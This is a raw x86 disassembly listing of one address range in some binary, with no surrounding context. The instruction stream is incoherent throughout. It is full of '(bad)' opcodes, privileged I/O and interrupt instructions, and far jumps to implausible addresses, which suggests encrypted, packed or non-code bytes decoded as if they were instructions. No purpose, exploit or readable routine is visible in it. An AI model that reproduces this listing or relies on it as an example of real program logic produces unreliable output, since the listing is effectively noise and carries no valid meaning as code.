  41e7aa:	mov    ah,BYTE PTR [eax]
  41e7ac:	xchg   ebx,eax
  41e7ad:	add    ebx,edx
  41e7af:	xor    BYTE PTR [ecx],bh
  41e7b1:	(bad)  [edx+0x370b1fb2]
  41e7b7:	push   0x5f
  41e7b9:	daa    
  41e7ba:	sbb    al,0x52
  41e7bc:	add    BYTE PTR [edi-0x7312d748],dh
  41e7c2:	fwait
  41e7c3:	(bad)  
  41e7c4:	push   ecx
  41e7c5:	xor    al,BYTE PTR [ebx-0x777253b0]
  41e7cb:	xchg   edx,eax
  41e7cc:	pop    ds
  41e7cd:	adc    edx,DWORD PTR [esi]
  41e7cf:	gs push cs
  41e7d1:	sbb    ch,BYTE PTR [edi+0x50]
  41e7d4:	fs (bad) 
  41e7d6:	gs mov ebp,0x4f9dfaa0
  41e7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7dd:	sub    esi,DWORD PTR [edi]
  41e7df:	test   DWORD PTR [ecx+eax*2],0xe6da3453
  41e7e6:	sti    
  41e7e7:	push   es
  41e7e8:	daa    
  41e7e9:	cmc    
  41e7ea:	mov    ebp,0xfe2f84f2
  41e7ef:	jo     0x41e815
  41e7f1:	sbb    DWORD PTR [edx-0x7c470fc4],0xffffffd2
  41e7f8:	stos   BYTE PTR es:[edi],al
  41e7f9:	lds    ebp,FWORD PTR [edx-0x38cc1fcd]
  41e7ff:	push   ebx
  41e800:	repnz xor eax,0xc415cd6
  41e806:	xor    BYTE PTR [ebx],0x70
  41e809:	mov    ch,0x1c
  41e80b:	lock mov bl,0xe1
  41e80e:	test   DWORD PTR [ecx-0x74941ca3],0x5db4fc19
  41e818:	or     DWORD PTR [ebx-0x32820bca],esi
  41e81e:	pop    esp
  41e81f:	mov    dh,0x3
  41e821:	mov    esp,0x64cbbb51
  41e826:	add    bh,ah
  41e828:	dec    eax
  41e829:	(bad)  ds:0xc9470bfb
  41e82f:	ret    0x2501
  41e832:	out    0x7d,al
  41e834:	push   ss
  41e835:	or     DWORD PTR [eax+0x72e40c6b],ebp
  41e83b:	enter  0xa0bf,0x35
  41e83f:	or     edi,DWORD PTR [eax]
  41e841:	ins    DWORD PTR es:[edi],dx
  41e842:	add    BYTE PTR [edi],cl
  41e844:	jne    0x41e8af
  41e846:	mov    esi,0x5e8f3e17
  41e84b:	pop    ds
  41e84c:	sti    
  41e84d:	push   0x43
  41e84f:	std    
  41e850:	and    ch,dh
  41e852:	mov    bh,BYTE PTR [esi+edi*1+0x38d1ea9b]
  41e859:	les    esp,FWORD PTR ds:0x995c817e
  41e85f:	add    al,BYTE PTR ds:0x963b71f3
  41e865:	fwait
  41e866:	in     eax,0x6d
  41e868:	mov    edx,0xe648e31f
  41e86d:	das    
  41e86e:	shr    DWORD PTR [esi],0xe1
  41e871:	push   ecx
  41e872:	pop    es
  41e873:	mov    al,ch
  41e875:	pop    esi
  41e876:	add    esp,edi
  41e878:	iret   
  41e879:	fucom  st(6)
  41e87b:	stos   BYTE PTR es:[edi],al
  41e87c:	sbb    eax,0xfbb6859c
  41e881:	add    DWORD PTR [ebx],esi
  41e883:	loop   0x41e8c2
  41e885:	mov    dh,0xc1
  41e887:	stos   DWORD PTR es:[edi],eax
  41e888:	mov    WORD PTR [eax],es
  41e88a:	retf   0x813b
  41e88d:	ss sbb eax,0xc374e1f9
  41e893:	arpl   WORD PTR [ecx],si
  41e895:	loope  0x41e870
  41e897:	test   BYTE PTR [eax],dh
  41e899:	xor    DWORD PTR [eax+0x51],ebp
  41e89c:	adc    ch,ch
  41e89e:	mov    al,0x95
  41e8a0:	sar    DWORD PTR [ebp+0x5f],cl
  41e8a3:	(bad)  
  41e8a4:	cli    
  41e8a5:	push   esi
  41e8a6:	test   DWORD PTR [edi-0x2849cc9b],edi
  41e8ac:	mov    ch,0x8c
  41e8ae:	cmp    DWORD PTR [edx+0xf9ed8d6],ebp
  41e8b4:	js     0x41e8d6
  41e8b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8b7:	outs   dx,DWORD PTR ds:[esi]
  41e8b8:	arpl   WORD PTR [ebp-0x4c],dx
  41e8bb:	cmp    al,0x9b
  41e8bd:	into   
  41e8be:	leave  
  41e8bf:	and    bl,cl
  41e8c1:	imul   ebx,eax,0x7aa4ebdc
  41e8c7:	dec    esp
  41e8c8:	das    
  41e8c9:	add    DWORD PTR ds:0x4b4ed0cb,eax
  41e8cf:	adc    ch,BYTE PTR [eax-0x3d2a6606]
  41e8d5:	sbb    eax,0xdfa6a82d
  41e8da:	cmp    eax,0xaf4b1d19
  41e8df:	sbb    BYTE PTR [ebx],0x99
  41e8e2:	dec    eax
  41e8e3:	rcr    BYTE PTR ds:0xf7506ffc,1
  41e8e9:	inc    edi
  41e8eb:	std    
  41e8ec:	addr16 (bad) 
  41e8ee:	cmp    al,0x35
  41e8f0:	and    dh,cl
  41e8f2:	inc    ebp
  41e8f3:	popf   
  41e8f4:	jne    0x41e88b
  41e8f6:	fdivr  DWORD PTR [edi]
  41e8f8:	cmp    BYTE PTR [edi+esi*8-0x4630bedf],bh
  41e8ff:	lods   al,BYTE PTR ds:[esi]
  41e900:	pop    edi
  41e901:	inc    esp
  41e902:	sbb    DWORD PTR [ebp+edx*4+0x3adb0ad],esi
  41e909:	sbb    BYTE PTR [ebp+eax*1-0x31ae7200],dh
  41e910:	dec    ecx
  41e911:	ret    
  41e912:	jb     0x41e96e
  41e914:	xor    eax,0xcdbab1bc
  41e919:	mov    ds:0xc571ad94,eax
  41e91e:	in     eax,0x98
  41e920:	xor    BYTE PTR [esi],bl
  41e922:	fcmovnbe st,st(1)
  41e924:	dec    ebp
  41e925:	ret    0x511a
  41e928:	cmp    eax,0xf5d61649
  41e92d:	cwde   
  41e92e:	lahf   
  41e92f:	push   esp
  41e930:	jo     0x41e94e
  41e932:	or     al,0x31
  41e934:	adc    cl,BYTE PTR [ebx+0x5a83e841]
  41e93a:	fisttp DWORD PTR [edi]
  41e93c:	(bad)  
  41e93d:	mov    ch,0x9a
  41e93f:	in     al,0x7d
  41e941:	jmp    0x1d67:0x9c9e418e
  41e948:	fld    st(7)
  41e94a:	scas   al,BYTE PTR es:[edi]
  41e94b:	mov    ch,0x1d
  41e94d:	cmp    dl,dh
  41e94f:	xchg   BYTE PTR [ebx+0x3e],bh
  41e952:	outs   dx,DWORD PTR ds:[esi]
  41e953:	in     al,0x4c
  41e955:	cmp    bl,BYTE PTR [ecx+0x7db13cbf]
  41e95b:	or     dl,dh
  41e95d:	jp     0xedbe2764
  41e963:	sbb    DWORD PTR [eax+0x5398ae79],edi
  41e969:	fistp  WORD PTR [edx]
  41e96b:	and    eax,0x4ebabec4
  41e970:	scas   al,BYTE PTR es:[edi]
  41e971:	fisub  DWORD PTR [ecx+0x540bb6b8]
  41e977:	mov    ch,0x29
  41e979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e97a:	inc    edx
  41e97b:	ret    0x18c5
  41e97e:	jnp    0x41e902
  41e980:	add    al,0xb7
  41e982:	out    0xdf,eax
  41e984:	push   0xd1037996
  41e989:	daa    
  41e98a:	inc    ebx
  41e98b:	jae    0x41e963
  41e98d:	outs   dx,DWORD PTR ds:[esi]
  41e98e:	enter  0x889a,0xfe
  41e992:	mov    bl,BYTE PTR [edi+ecx*1]
  41e995:	jne    0x41e99b
  41e997:	sub    dl,BYTE PTR [esi]
  41e999:	xor    al,0xd3
  41e99b:	test   eax,0x6478a564
  41e9a0:	sbb    esp,DWORD PTR [esi-0x19]
  41e9a3:	ins    DWORD PTR es:[edi],dx
  41e9a4:	mov    edx,0x6c8cb382
  41e9a9:	bnd jp 0x41ea29
  41e9ac:	fs das 
  41e9ae:	inc    ebp
  41e9af:	xor    BYTE PTR [edi-0x48],ah
  41e9b2:	mov    eax,0x99200bc0
  41e9b7:	push   esi
  41e9b8:	add    eax,0x296117e0
  41e9bd:	and    cl,BYTE PTR [edx+0x47031361]
  41e9c3:	xchg   ebp,eax
  41e9c4:	push   edi
  41e9c5:	(bad)  
  41e9c7:	inc    DWORD PTR [ebx+eax*4]
  41e9ca:	add    al,0x9a
  41e9cc:	jbe    0x41e999
  41e9ce:	inc    esi
  41e9cf:	cmp    BYTE PTR [ebx+0x4e5994c7],0x6c
  41e9d6:	loopne 0x41e9a5
  41e9d8:	pop    edx
  41e9d9:	mov    esp,0x52530b20
  41e9de:	pop    eax
  41e9df:	icebp  
  41e9e0:	mov    dl,0x28
  41e9e2:	in     al,dx
  41e9e3:	fisub  DWORD PTR [eax+0x1933ea83]
  41e9e9:	and    eax,DWORD PTR [eax-0x43d79d08]
  41e9ef:	mov    eax,ds:0x2dce88fd
  41e9f4:	ficomp DWORD PTR [edi+esi*8+0x20fb30ba]
  41e9fb:	retf   
  41e9fc:	cdq    
  41e9fd:	shl    DWORD PTR [ebx+0x79],cl
  41ea00:	sub    BYTE PTR [esp+ebp*2+0x7d470156],dh
  41ea07:	push   eax
  41ea08:	test   eax,0x7dbc36e0
  41ea0d:	sahf   
  41ea0e:	inc    esp
  41ea0f:	imul   eax,DWORD PTR [ecx],0xffffffce
  41ea12:	out    dx,al
  41ea13:	ins    DWORD PTR es:[edi],dx
  41ea14:	mov    bx,0xe691
  41ea18:	push   es
  41ea19:	addr16 (bad) 
  41ea1b:	cli    
  41ea1c:	pop    edx
  41ea1d:	scas   eax,DWORD PTR es:[edi]
  41ea1e:	sub    eax,0xaaf92382
  41ea23:	pop    eax
  41ea24:	xchg   ecx,eax
  41ea25:	fsubr  QWORD PTR [edx]
  41ea27:	xor    eax,0x2ce9d27f
  41ea2c:	mov    esp,0x6c5b734
  41ea31:	xor    eax,0x5ff14185
  41ea36:	and    al,0xa7
  41ea38:	pop    ebp
  41ea39:	ficom  DWORD PTR [edx-0x5f845214]
  41ea3f:	xor    bh,dl
  41ea41:	mov    ss,ecx
  41ea43:	mov    edx,DWORD PTR [edi-0x7]
  41ea46:	(bad)  
  41ea48:	imul   bl
  41ea4a:	enter  0xdcb3,0x8
  41ea4e:	inc    esi
  41ea4f:	(bad)  
  41ea50:	fsub   st(6),st
  41ea52:	push   ss
  41ea53:	xchg   ecx,eax
  41ea54:	inc    eax
  41ea55:	sbb    al,0x66
  41ea57:	in     eax,0x9e
  41ea59:	test   ch,bl
  41ea5b:	pop    ecx
  41ea5c:	test   DWORD PTR ds:0x29249a3c,ebx
  41ea62:	or     esi,DWORD PTR [ebx-0x2a]
  41ea65:	fs repz pusha 
  41ea68:	xchg   ebx,eax
  41ea69:	cmp    DWORD PTR [ecx],edx
  41ea6b:	push   ecx
  41ea6c:	std    
  41ea6d:	test   BYTE PTR [ecx],al
  41ea6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea70:	data16 ins BYTE PTR es:[edi],dx
  41ea72:	cmc    
  41ea73:	dec    ebp
  41ea74:	imul   edi,DWORD PTR [ecx-0x4c],0x60342b67
  41ea7b:	aad    0x20
  41ea7d:	or     eax,0xc0530eae
  41ea82:	sahf   
  41ea83:	or     dl,BYTE PTR [ebx-0x51]
  41ea86:	lods   eax,DWORD PTR ds:[esi]
  41ea87:	pop    ecx
  41ea88:	sub    edx,DWORD PTR ds:0x34eb3987
  41ea8e:	or     edx,DWORD PTR [ebp+0x3b41d33d]
  41ea94:	call   0x8330aafe
  41ea99:	outs   dx,DWORD PTR ds:[esi]
  41ea9a:	push   ecx
  41ea9b:	xor    DWORD PTR [ebx-0x62d6d231],ebp
  41eaa1:	xchg   DWORD PTR [edx+0x3f153eda],ecx
  41eaa7:	fxch   st(2)
  41eaa9:	leave  
  41eaaa:	int    0x2c
  41eaac:	fist   WORD PTR ds:0x4d7ea228
  41eab2:	mov    ds:0x54ffda68,al
  41eab7:	sbb    BYTE PTR es:[esi],cl
  41eaba:	out    0x8c,al
  41eabc:	fnsave [ecx-0x7f]
  41eabf:	push   0x6c
  41eac1:	arpl   WORD PTR [ecx-0x5b16f45b],bx
  41eac7:	mov    edi,0x779ea787
  41eacc:	retf   0x9f1e
  41eacf:	lds    edi,FWORD PTR [eax-0x76]
  41ead2:	test   eax,0x58b691c0
  41ead7:	mov    dh,0x39
  41ead9:	mov    dh,0x65
  41eadb:	outs   dx,BYTE PTR ds:[esi]
  41eadc:	sbb    ebx,DWORD PTR [ebp+0x30]
  41eadf:	lods   al,BYTE PTR ds:[esi]
  41eae0:	fcomp  DWORD PTR [edi]
  41eae2:	scas   eax,DWORD PTR es:[edi]
  41eae3:	sub    edi,edi
  41eae5:	jecxz  0x41eb24
  41eae7:	mov    ebx,0x697a1f0a
  41eaec:	sbb    BYTE PTR [ebx],bl
  41eaee:	test   al,0x80
  41eaf0:	aaa    
  41eaf1:	test   al,0x97
  41eaf3:	fdiv   st,st(1)
  41eaf5:	inc    edx
  41eaf6:	jne    0x41eb50
  41eaf8:	lods   eax,DWORD PTR ds:[esi]
  41eaf9:	inc    edi
  41eafa:	sar    BYTE PTR [esi],0x5c
  41eafd:	jbe    0x41ead7
  41eaff:	imul   ecx,DWORD PTR [edi],0x7d8bd7af
  41eb05:	clc    
  41eb06:	mov    ebx,DWORD PTR [ebp-0x10]
  41eb09:	sub    ebx,edi
  41eb0b:	jmp    0x41f01d
  41eb10:	ror    al,cl
  41eb12:	retf   0xcad0
  41eb15:	fcmovbe st,st(2)
  41eb17:	fcmovb st,st(3)
  41eb19:	mov    ebx,0xdf67981f
  41eb1e:	pop    ss
  41eb1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb20:	(bad)  
  41eb21:	inc    edx
  41eb22:	jg     0x41eb9c
  41eb24:	jae    0x41eba2
  41eb26:	js     0x41eba0
  41eb28:	(bad)  
  41eb29:	lods   eax,DWORD PTR ds:[esi]
  41eb2a:	xchg   edi,eax
  41eb2b:	push   ss
  41eb2c:	or     al,0xb3
  41eb2e:	mov    ecx,0x27283a38
  41eb33:	aad    0x80
  41eb35:	fwait
  41eb36:	call   0x68bc:0x9fc82e00
  41eb3d:	push   edx
  41eb3e:	je     0x41eb0f
  41eb40:	scas   al,BYTE PTR es:[edi]
  41eb41:	adc    ch,BYTE PTR [eax+0x5d]
  41eb44:	out    0x71,eax
  41eb46:	bound  ecx,QWORD PTR [edx-0x6b4042dd]
  41eb4c:	fdivrp st(3),st
  41eb4e:	mov    esp,0xba9db0fe
  41eb53:	mov    ah,0x71
  41eb55:	mov    dh,0x39
  41eb57:	adc    edi,DWORD PTR [ecx-0xa2cee29]
  41eb5d:	mov    ebx,0x8906c7ea
  41eb62:	sub    BYTE PTR [ebx+ebp*1+0x58],0x97
  41eb67:	pop    ebx
  41eb68:	dec    ecx
  41eb69:	sti    
  41eb6a:	ja     0x41ebe4
  41eb6c:	dec    eax
  41eb6d:	stos   BYTE PTR es:[edi],al
  41eb6e:	dec    ecx
  41eb6f:	aaa    
  41eb70:	sub    al,0xfe
  41eb72:	dec    ebx
  41eb73:	icebp  
  41eb74:	fwait
  41eb75:	push   es
  41eb76:	mov    bl,0xe1
  41eb78:	xchg   ecx,eax
  41eb79:	and    DWORD PTR [ebp-0x39fcef58],esi
  41eb7f:	inc    ebx
  41eb80:	push   es
  41eb81:	sbb    eax,0x8fe64d81
  41eb86:	jno    0x41ebf3
  41eb88:	inc    esp
  41eb89:	push   edx
  41eb8a:	js     0x41ebf0
  41eb8c:	dec    BYTE PTR [edi]
  41eb8e:	jbe    0x41ec06
  41eb90:	out    0x12,eax
  41eb92:	out    0xff,al
  41eb94:	or     eax,0x75218ca9
  41eb99:	add    ebx,edx
  41eb9b:	pop    ecx
  41eb9c:	push   0xbadf7191
  41eba1:	inc    esi
  41eba2:	sbb    eax,0x2c5b6cac
  41eba7:	cmp    bl,BYTE PTR [edi+ebp*8+0x2711a850]
  41ebae:	aad    0x4a
  41ebb0:	stos   DWORD PTR es:[edi],eax
  41ebb1:	jb     0x41ebbc
  41ebb3:	rcl    BYTE PTR [edi],1
  41ebb5:	push   0xa5543f99
  41ebba:	popa   
  41ebbb:	into   
  41ebbc:	sub    eax,0x3041abfd
  41ebc1:	lock add eax,0x60fd20ad
  41ebc7:	push   eax
  41ebc8:	push   ebp
  41ebc9:	push   ecx
  41ebca:	(bad)  
  41ebcb:	in     al,0xec
  41ebcd:	xor    BYTE PTR [edx],cl
  41ebcf:	fstp   DWORD PTR es:[esi-0x51f5cd61]
  41ebd6:	cmc    
  41ebd7:	into   
  41ebd8:	stos   BYTE PTR es:[edi],al
  41ebd9:	scas   eax,DWORD PTR es:[edi]
  41ebda:	jecxz  0x41ec22
  41ebdc:	pop    eax
  41ebdd:	out    dx,al
  41ebde:	fsub   QWORD PTR [esi]
  41ebe0:	add    eax,0xc337aa77
  41ebe5:	sub    eax,0x21af039
  41ebea:	adc    BYTE PTR [ecx-0x8],cl
  41ebed:	jb     0xa6833d46
  41ebf3:	cmp    bh,dl
  41ebf5:	jmp    0xbda8:0x53c3903e
  41ebfc:	jmp    0xd885c7c5
  41ec01:	jge    0x41ec5a
  41ec03:	cmp    DWORD PTR [esi-0x2fe220b4],edx
  41ec09:	mov    cl,0x99
  41ec0b:	add    eax,0x16a95842
  41ec10:	pushf  
  41ec11:	inc    ecx
  41ec12:	or     bh,dl
  41ec14:	lock (bad) [ecx+0x2527ff9]
  41ec1b:	inc    edi
  41ec1c:	daa    
  41ec1d:	dec    ebx
  41ec1e:	and    bl,ch
  41ec20:	fisttp WORD PTR [eax+0x52]
  41ec23:	(bad)  
  41ec24:	cmp    BYTE PTR [edi+0x96e0178],ah
  41ec2a:	push   eax
  41ec2b:	and    DWORD PTR [eax+0x6c],ecx
  41ec2e:	(bad)  [eax+0x73ab0bba]
  41ec34:	sbb    ecx,ebx
  41ec36:	sbb    DWORD PTR [ebx],eax
  41ec38:	cmp    bh,BYTE PTR [eax+0x51]
  41ec3b:	or     al,0xdc
  41ec3d:	in     eax,0xab
  41ec3f:	sub    eax,0xdc25ec25
  41ec44:	(bad)  
  41ec45:	outs   dx,DWORD PTR ds:[esi]
  41ec46:	inc    eax
  41ec47:	jmp    FWORD PTR [edx]
  41ec49:	inc    eax
  41ec4a:	inc    ebp
  41ec4b:	loope  0x41ec09
  41ec4d:	je     0x41ebfe
  41ec4f:	pop    es
  41ec50:	sbb    esp,DWORD PTR [esi]
  41ec52:	add    edx,edi
  41ec54:	fisttp WORD PTR [ebp-0x356f3249]
  41ec5a:	ret    
  41ec5b:	push   ebx
  41ec5c:	pop    esi
  41ec5d:	dec    eax
  41ec5e:	push   es
  41ec5f:	mov    dl,0xdf
  41ec61:	ja     0x41ec99
  41ec63:	enter  0x6d0f,0x62
  41ec67:	test   dh,0xf4
  41ec6a:	in     al,0x75
  41ec6c:	lds    esp,FWORD PTR [edx]
  41ec6e:	inc    esp
  41ec6f:	pop    edx
  41ec70:	jle    0x41eca1
  41ec72:	push   es
  41ec73:	mov    bh,0x11
  41ec75:	test   DWORD PTR [edi-0x507724a5],0x450458c4
  41ec7f:	scas   eax,DWORD PTR es:[edi]
  41ec80:	in     al,0x5f
  41ec82:	cli    
  41ec83:	cld    
  41ec84:	push   edi
  41ec85:	jmp    0xd8c49395
  41ec8a:	call   0x5204:0x2f743620
  41ec91:	call   0xeb3dc905
  41ec96:	mov    ebx,DWORD PTR [edi]
  41ec98:	out    0x7f,al
  41ec9a:	mov    dh,0x21
  41ec9c:	mov    eax,0x8788b33a
  41eca1:	or     al,0xff
  41eca3:	test   BYTE PTR [esi+0x5b0ade14],dh
  41eca9:	lock or al,0xa7
  41ecac:	mov    BYTE PTR [eax-0x36d0daef],ch
  41ecb2:	dec    edx
  41ecb3:	sub    dl,BYTE PTR [eax]
  41ecb5:	dec    edx
  41ecb6:	ins    BYTE PTR es:[edi],dx
  41ecb7:	sbb    al,0x26
  41ecb9:	stos   BYTE PTR es:[edi],al
  41ecba:	outs   dx,BYTE PTR ds:[esi]
  41ecbb:	(bad)  
  41ecbc:	cmp    eax,0xac8efabb
  41ecc1:	shr    DWORD PTR [esi+0x36],cl
  41ecc4:	fs int3 
  41ecc6:	mov    ah,0xf9
  41ecc8:	mov    edi,DWORD PTR [esi]
  41ecca:	out    dx,eax
  41eccb:	sbb    ecx,DWORD PTR [ebx+0x48]
  41ecce:	test   eax,0x132de990
  41ecd3:	fmul   DWORD PTR [edi]
  41ecd5:	stos   DWORD PTR es:[edi],eax
  41ecd6:	jp     0x41ec9c
  41ecd8:	lods   eax,DWORD PTR ds:[esi]
  41ecd9:	sti    
  41ecda:	xchg   edx,eax
  41ecdb:	mov    edx,0x6cc6f149
  41ece0:	adc    eax,0x939d6dc7
  41ece5:	out    dx,al
  41ece6:	pop    ebx
  41ece7:	stos   BYTE PTR es:[edi],al
  41ece8:	mov    ebx,0x9c6af35e
  41eced:	or     ebp,DWORD PTR [edi]
  41ecef:	or     BYTE PTR [eax+0x33728d5b],dl
  41ecf5:	stc    
  41ecf6:	push   ebx
  41ecf7:	mov    esi,0x6706d22
  41ecfc:	pop    ds
  41ecfd:	or     al,0xf4
  41ecff:	daa    
  41ed00:	retf   0xc577
  41ed03:	cmp    eax,0x6a0f0e3c
  41ed08:	push   0x7c
  41ed0a:	push   edx
  41ed0b:	mov    edi,0xfd38a1ec
  41ed10:	mov    ds:0xf189fc6d,eax
  41ed15:	sub    eax,0x671629e
  41ed1a:	clc    
  41ed1b:	mov    dh,0xc2
  41ed1d:	xchg   edx,eax
  41ed1e:	inc    ecx
  41ed1f:	and    al,0xfb
  41ed21:	mov    ch,0xe3
  41ed23:	js     0x41ed7f
  41ed25:	imul   ebx,DWORD PTR ds:0x535fb309,0xffffffb0
  41ed2c:	cmp    BYTE PTR [ecx+0x125b38fe],al
  41ed32:	rol    edi,0xa4
  41ed35:	add    dh,BYTE PTR [ebp-0x6c]
  41ed38:	sub    dh,BYTE PTR [ebx+0x4da91bf0]
  41ed3e:	mov    eax,0xc5f90e4f
  41ed43:	xor    DWORD PTR [edx+ecx*8+0x59],esi
  41ed47:	pop    esi
  41ed48:	cmp    edi,ecx
  41ed4a:	push   ds
  41ed4b:	lods   eax,DWORD PTR ds:[esi]
  41ed4c:	xchg   DWORD PTR [esi-0x12945e8f],ecx
  41ed52:	sub    ebp,DWORD PTR [ebp+0x6e1a013a]
  41ed58:	pop    edi
  41ed59:	push   es
  41ed5a:	daa    
  41ed5b:	cmovp  esp,DWORD PTR [ebp-0x62]
  41ed5f:	dec    ebx
  41ed60:	xchg   BYTE PTR [edx],cl
  41ed62:	inc    ecx
  41ed63:	push   eax
  41ed64:	xchg   edx,eax
  41ed65:	std    
  41ed66:	retf   
  41ed67:	cwde   
  41ed68:	scas   al,BYTE PTR es:[edi]
  41ed69:	pop    esp
  41ed6a:	mov    cl,0x7e
  41ed6c:	inc    esp
  41ed6d:	cmp    edx,ebx
  41ed6f:	mov    esi,0x4c418ad6
  41ed74:	sub    BYTE PTR [esi+0x70eae581],0x35
  41ed7b:	push   cs
  41ed7c:	lahf   
  41ed7d:	xor    esp,DWORD PTR [edi]
  41ed7f:	xor    eax,DWORD PTR [esi+0x4f]
  41ed82:	ds inc edi
  41ed84:	scas   al,BYTE PTR es:[edi]
  41ed85:	dec    edi
  41ed86:	scas   eax,DWORD PTR es:[edi]
  41ed87:	stc    
  41ed88:	fsubr  DWORD PTR [ebx+0x5ac12245]
  41ed8e:	sbb    edx,DWORD PTR [ebp-0x69]
  41ed91:	pop    esp
  41ed92:	daa    
  41ed93:	push   ss
  41ed94:	jbe    0x41ed55
  41ed96:	push   ebx
  41ed97:	sahf   
  41ed98:	sub    eax,0x69bc80fd
  41ed9d:	test   al,0xd5
  41ed9f:	loopne 0x41ee1e
  41eda1:	jp     0x41ed6b
  41eda3:	xchg   ecx,eax
  41eda4:	out    0x77,al
  41eda6:	xchg   DWORD PTR [esi],eax
  41eda8:	jb     0x41ede4
  41edaa:	mov    edx,0x4ceacde0
  41edaf:	and    bl,bl
  41edb1:	mov    dh,0x35
  41edb3:	inc    edi
  41edb4:	add    al,0x65
  41edb6:	shl    BYTE PTR [ebx],1
  41edb8:	fbld   TBYTE PTR [eax+0x6b5e6bf7]
  41edbe:	xchg   edi,eax
  41edbf:	out    dx,al
  41edc0:	push   ss
  41edc1:	sbb    BYTE PTR [eax+0x23],0xf6
  41edc5:	pop    ebx
  41edc6:	cs pop eax
  41edc8:	cmp    DWORD PTR [edi+eax*4-0x120541c8],edx
  41edcf:	je     0x41ee0d
  41edd1:	mov    edx,0xcd2bd0d6
  41edd6:	je     0x41edc5
  41edd8:	push   ebx
  41edd9:	push   ds
  41edda:	push   eax
  41eddb:	loopne 0x41ee5b
  41eddd:	aam    0xfa
  41eddf:	imul   esi,DWORD PTR [edi+0x2d],0x5cce6cb2
  41ede6:	fnstenv [ebp+0x31]
  41ede9:	mov    ecx,0xf24b93b8
  41edee:	adc    BYTE PTR [ebx],cl
  41edf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edf1:	sub    al,0x1d
  41edf3:	out    dx,al
  41edf4:	loope  0x41ee20
  41edf6:	test   DWORD PTR [ecx+0x33],edi
  41edf9:	sahf   
  41edfa:	jl     0x41ed91
  41edfc:	js     0x41ee56
  41edfe:	aaa    
  41edff:	in     al,dx
  41ee00:	sahf   
  41ee01:	cmc    
  41ee02:	cli    
  41ee03:	push   ebx
  41ee04:	add    eax,0x77e36ec9
  41ee09:	fwait
  41ee0a:	mov    eax,0xbb966f4f
  41ee0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee10:	test   al,0x90
  41ee12:	push   ss
  41ee13:	jle    0x41ee17
  41ee15:	stos   DWORD PTR es:[edi],eax
  41ee16:	retf   0x1b2b
  41ee19:	mov    eax,ds:0x270c3dc3
  41ee1e:	lods   al,BYTE PTR ds:[esi]
  41ee1f:	sub    BYTE PTR [edi-0x58866843],bl
  41ee25:	sahf   
  41ee26:	push   es
  41ee27:	lds    ecx,FWORD PTR ss:[esi-0x37]
  41ee2b:	push   es
  41ee2c:	mov    eax,ds:0xcf2cd61d
  41ee31:	leave  
  41ee32:	ficomp DWORD PTR [edx-0x175506ec]
  41ee38:	stc    
  41ee39:	xchg   ebp,eax
  41ee3a:	lods   al,BYTE PTR ds:[esi]
  41ee3b:	cmp    BYTE PTR [edx],dh
  41ee3d:	adc    eax,0x89249462
  41ee42:	icebp  
  41ee43:	cmp    eax,ebp
  41ee45:	rcl    cl,1
  41ee47:	sbb    edx,edi
  41ee49:	bound  esp,QWORD PTR [esi-0x6ca1e1db]
  41ee4f:	daa    
  41ee50:	pop    edx
  41ee51:	sub    eax,0xfa246497
  41ee56:	cmp    BYTE PTR [eax-0x537fffb1],0x6d
  41ee5d:	fadd   QWORD PTR [edx+esi*4]
  41ee60:	cli    
  41ee61:	or     BYTE PTR [ecx+0x6f],0xc9
  41ee65:	int    0xbd
  41ee67:	cli    
  41ee68:	imul   ebx,edi,0x289f7817
  41ee6e:	fst    QWORD PTR [edx+eax*4]
  41ee71:	and    edi,edx
  41ee73:	xor    eax,0xedf035d
  41ee78:	ror    BYTE PTR [eax+0x418d09fb],1
  41ee7e:	cmp    eax,0x93cffadd
  41ee83:	aaa    
  41ee84:	sbb    esi,DWORD PTR [edi+ebx*4+0x4f]
  41ee88:	pop    ds
  41ee89:	out    dx,al
  41ee8a:	in     al,0xe7
  41ee8c:	xor    bh,bl
  41ee8e:	xor    DWORD PTR [eax],ebx
  41ee90:	stc    
  41ee91:	dec    ecx
  41ee92:	or     BYTE PTR [ebx-0x71ca4bd6],bh
  41ee98:	jle    0x41ef14
  41ee9a:	shl    DWORD PTR [eax],1
  41ee9c:	retf   
  41ee9d:	imul   esi,DWORD PTR [eax],0x2d
  41eea0:	leave  
  41eea1:	enter  0x5664,0xe5
  41eea5:	mov    al,ds:0xeb9a0335
  41eeaa:	dec    esi
  41eeab:	or     edx,eax
  41eead:	pop    ecx
  41eeae:	pop    ebx
  41eeaf:	jbe    0x41ee68
  41eeb1:	fnstsw WORD PTR [edx-0x49]
  41eeb4:	aaa    
  41eeb5:	mov    esi,0xf9f152cc
  41eeba:	sbb    ecx,eax
  41eebc:	or     esi,edx
  41eebe:	mov    eax,0x47af5135
  41eec3:	es cld 
  41eec5:	mov    BYTE PTR ds:0xc1ddeb94,al
  41eecb:	jge    0x41eee5
  41eecd:	in     eax,0x78
  41eecf:	iret   
  41eed0:	adc    DWORD PTR [esi+0x15],esi
  41eed3:	test   BYTE PTR [ebx],ch
  41eed5:	sub    eax,0x3a672b98
  41eeda:	aaa    
  41eedb:	cmp    edi,esi
  41eedd:	inc    edi
  41eede:	popa   
  41eedf:	adc    eax,0xb45712b7
  41eee4:	cmp    cl,dl
  41eee6:	sbb    edx,edx
  41eee8:	sbb    eax,esi
  41eeea:	add    eax,0xe50a47af
  41eeef:	add    ch,BYTE PTR [edi+ebp*4]
  41eef2:	jns    0x41eef0
  41eef4:	sub    al,BYTE PTR [eiz*4+0x3401f440]
  41eefb:	inc    esp
  41eefc:	iret   
  41eefd:	mov    esp,0xcb657716
  41ef02:	jae    0x41eec3
  41ef04:	jp     0x41eef8
  41ef06:	push   esi
  41ef07:	std    
  41ef08:	add    ecx,DWORD PTR [esi]
  41ef0a:	and    eax,0x524ca08
  41ef0f:	mov    cl,0x45
  41ef11:	pop    ebp
  41ef12:	adc    edi,0xffffffa7
  41ef15:	bound  ebp,QWORD PTR [eax+ebp*4]
  41ef18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef19:	dec    esp
  41ef1a:	push   0xe3927cf8
  41ef1f:	push   ss
  41ef20:	(bad)  
  41ef21:	mov    esp,0xffdab97f
  41ef26:	aam    0x7b
  41ef28:	aas    
  41ef29:	jo     0x41ef06
